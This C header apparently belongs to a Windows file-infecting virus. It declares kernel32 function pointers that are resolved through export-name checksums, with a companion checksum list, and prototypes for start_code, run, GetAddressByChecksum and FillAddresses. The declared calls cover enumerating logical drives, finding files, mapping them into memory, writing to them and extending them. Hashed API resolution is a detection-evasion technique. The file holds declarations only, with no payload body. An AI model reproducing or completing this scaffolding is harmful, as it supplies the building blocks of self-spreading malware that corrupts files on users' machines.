#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "ass.h"
#include "checksum.h"
#include "checksum_list.h"

typedef void(WINAPI *fpExitProcess)(UINT);
typedef DWORD(WINAPI *fpGetTickCount)(void);
typedef HANDLE(WINAPI *fpGetProcessHeap)(void);
typedef LPVOID(WINAPI *fpHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI *fpHeapFree)(HANDLE, DWORD, LPVOID);
typedef HANDLE(WINAPI *fpFindFirstFileA)(LPCTSTR, LPWIN32_FIND_DATA);
typedef BOOL(WINAPI *fpFindNextFileA)(HANDLE, LPWIN32_FIND_DATA);
typedef BOOL(WINAPI *fpFindClose)(HANDLE);
typedef HANDLE(WINAPI *fpCreateFileA)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI *fpGetFileSize)(HANDLE, LPDWORD);
typedef HANDLE(WINAPI *fpCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCTSTR);
typedef LPVOID(WINAPI *fpMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI *fpFlushViewOfFile)(LPCVOID, SIZE_T);
typedef BOOL(WINAPI *fpUnmapViewOfFile)(LPCVOID);
typedef DWORD(WINAPI *fpSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL(WINAPI *fpSetEndOfFile)(HANDLE);
typedef BOOL(WINAPI *fpCloseHandle)(HANDLE);
typedef void(WINAPI *fpCopyMemory)(PVOID, const VOID*, SIZE_T);
typedef HANDLE(WINAPI *fpCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI *fpGetLogicalDrives)(void);
typedef VOID(WINAPI *fpSleep)(DWORD);

typedef struct {
    fpExitProcess* exitProcess;
    fpGetTickCount* getTickCount;
    fpGetProcessHeap* getProcessHeap;
    fpHeapAlloc* heapAlloc;
    fpHeapFree* heapFree;
    fpFindFirstFileA* findFirstFileA;
    fpFindNextFileA* findNextFileA;
    fpFindClose* findClose;
    fpCreateFileA* createFileA;
    fpGetFileSize* getFileSize;
    fpCreateFileMappingA* createFileMappingA;
    fpMapViewOfFile* mapViewOfFile;
    fpFlushViewOfFile* flushViewOfFile;
    fpUnmapViewOfFile* unmapViewOfFile;
    fpSetFilePointer* setFilePointer;
    fpSetEndOfFile* setEndOfFile;
    fpCloseHandle* closeHandle;
    //fpCopyMemory* copyMemory;
    fpCreateThread* createThread;
    fpGetLogicalDrives* getLogicalDrives;
    fpSleep* sleep;
}functions_t;

typedef struct {
   uint8_t* imageBase;
   uint8_t* kernel32Base;
   functions_t functions;
}data_t;


void start_code(void);
int run(void);
void* GetAddressByChecksum(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, uint32_t cs);
int FillAddresses(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, functions_t* functions);
